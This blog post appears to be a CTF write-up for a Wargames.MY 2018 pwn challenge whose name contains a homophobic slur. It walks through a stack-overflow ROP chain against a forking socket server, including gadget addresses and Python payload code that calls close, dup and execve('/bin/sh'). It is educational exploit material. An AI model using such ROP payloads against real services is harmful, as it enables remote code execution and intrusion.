---
layout: post
title: Wargames.MY 2018 - faggot2.0 (pwn) - ROP with unknown file descriptor
id: wargamesmy18fgt
---

> [challenge][file]

It seems that no one solved this challenge during the competition. Due to the large amount of challenges, I also did not manage to work on this challenge, but solved it after the competition, so here's my writeup.

## Static Analysis
The program was rather straightforward, running as a fork server with the following pseudocode.

```c
int main() {
    int connectionfd;

    while(1) {
        int socketfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
        setsockopt(socketfd, SOL_SOCKET, SO_REUSEADDR, [1], 4);
        bind(socketfd, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("0.0.0.0")}, 16);
        listen(socketfd, 5);
        connectionfd = accept(socketfd, {sa_family=AF_INET, sin_port=htons(51320), sin_addr=inet_addr("127.0.0.1")}, [16]));

        if (!fork())    // if fork() == 0, then this is the child, then break out of listening loop
            break;
    }

    // ran by child process
    close(socketfd);

    char buf[15];
    read(connectionfd, buf, 0xf);
    int nbytes = atoi(buf);

    char biggerbuf[0x80];
    read(connectionfd, biggerbuf, nbytes);
}
```

*If you are wondering how to get the enums for the socket API functions easily, I just ran `strace` on the challenge binary, which will show all system calls being called by the process.*

As we can see, we can choose how many bytes we want to read. Immediate thought is to use [ROP](http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html). A good place to learn ROP would be the [ROP Emporium](https://ropemporium.com).

`checksec ./challenge`
```
[*] '/root/ctfs/wargamesmy/faggot2/challenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

CANARY and PIE were not enabled for this challenge, which makes things easier.

## Exploitation
As the challenge binary itself implements the server, the best way to debug my exploit is by attaching GDB to the child process (aka the client) every time I want to test it.

For the sake of convenience, my terminal is set up this way.

![workenv][workenv]

The top left pane, running `strace ./challenge`, will tell me the pid of the child process, which I can attach to using GDB in the bottom left pane.

By passing in a De-Brujin pattern, we find that a padding of `152` bytes is needed until we reach the return address in the stack.

### ROP Chain
As we are given an arbitrary amount of bytes to write, there aren't really any restrictions on our ROP chain apart from the gadgets we can find.

Using [ropper](https://github.com/sashs/Ropper), I managed to find gadgets for controlling registers `rax`, `rdi`, `rsi` and `rbp`, and also to write `eax` into a memory relative to `rbp`.

```py
POP_RAX_RET = 0x4009d2
POP_RDI_RET = 0x400ba3
POP_RBP_RET = 0x400840
POP_RSI_RET = 0x400ba1
SYSCALL = 0x4009d4
MOV_DWORD = 0x4009cf  # mov dword ptr [rbp - 8], eax; pop rax; ret
```

So now it's all left to constructing the rop chain.

#### `execve`
The most convenient way is to just call `execve("/bin/sh", 0, 0)`. But we need a pointer referring to memory containing the string `"/bin/sh"`. 

Looking into the mappings of the process, we can write into this region.

```
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /root/ctfs/wargamesmy/faggot
```

With the gadgets found earlier, we can write `"/bin/sh"` into address `0x601500` 4 bytes a time using `eax`.

```py
# pop rbp, ret;  sets rbp to 0x601508
# pop rax, ret;  sets rax to "/bin\x00\x00\x00\x00", aka eax to "/bin/sh"
# mov dword ptr [rbp - 8], eax; pop rax; ret;  we can now write "/bin" into 0x601508

# now, do it again for "/sh\x00"
# skipping pop rax, ret because the previous gadget already contains it
# pop rbp, ret;
# mov dword ...

payload += p64(POP_RBP_RET) + p64(0x601508)
payload += p64(POP_RAX_RET) + "/bin\x00\x00\x00\x00"
payload += p64(MOV_DWORD) + "/sh\x00\x00\x00\x00\x00"
payload += p64(POP_RBP_RET) + p64(0x60150c)
payload += p64(MOV_DWORD) + p64(0)
```

With `"/bin/sh"` in place, we can point `rdi` to it, clear `rsi`, and set `rax` to `0x3b` with is the syscall number of `execve`. We ignore `rdx` as it was fortunately already set to 0 by the program itself before reaching here.
```py
# execve("/bin/sh", 0, 0);

payload += p64(POP_RDI_RET) + p64(0x601500)
payload += p64(POP_RSI_RET) + p64(0) + p64(0)
payload += p64(POP_RAX_RET) + p64(0x3b)
payload += p64(SYSCALL)           
```

Now we can run the send the payload and get our shell. But it doesn't work? Nothing happens. 

#### `close` and `dup`
Recall that when the server connects to our client, it uses a different file descriptor for IO instead of the standard `stdin`, `stdout` and `stderr` in 0, 1 and 2.

We need to replace 0, 1 and 2 with the file descriptor for our client. We can do that by first closing those 3 files, using the `close` syscall. Then use `dup(connectionfd)` to duplicate our client's `fd`. 

`dup` works by duplicating the information of the given file to the lowest file descriptor number possible that is not opened yet, in which case its 0, 1 and 2 which we just closed.

Similar to `execve` above, we can set our registers to replace the file descriptors.
```py
# close(0); close(1); close(2)           
payload += p64(POP_RDI_RET) + p64(0)              
payload += p64(POP_RAX_RET) + p64(3)              
payload += p64(SYSCALL)
payload += p64(POP_RDI_RET) + p64(1)
payload += p64(POP_RAX_RET) + p64(3)                                                     
payload += p64(SYSCALL)
payload += p64(POP_RDI_RET) + p64(2)                                                     
payload += p64(POP_RAX_RET) + p64(3)
payload += p64(SYSCALL)

# dup(4)
payload += p64(POP_RDI_RET) + p64(4)
payload += p64(POP_RAX_RET) + p64(32)
payload += p64(SYSCALL)
payload += p64(POP_RDI_RET) + p64(4)
payload += p64(POP_RAX_RET) + p64(32)
payload += p64(SYSCALL)   
```

Now we can send the payload, and get a working shell!

Not quite yet. As you can see, we are duplicating the file number 4. This is based on the assumption that no other clients are connected to the server at this point in time. This is because 0, 1 and 2 are occupied by `stdin`, `stdout` and `stderr`, 3 is occupied by `socketfd`, making 4 the lowest available file number, which is assigned to the next client that connects. If say there are 5 clients connected at this time, then we will be assigned file number 9.

Well, with the assumption that there aren't a lot of teams in this CTF, we can run this exploit a few more times if it fails.

The full exploit script can be found [here][xpl].

***

[file]:{{site.baseurl}}/ctfs/wargamesmy-18/faggot2/challenge
[workenv]:{{site.baseurl}}/ctfs/wargamesmy-18/faggot2/workenv.png
[xpl]:{{site.baseurl}}/ctfs/wargamesmy-18/faggot2/xpl.py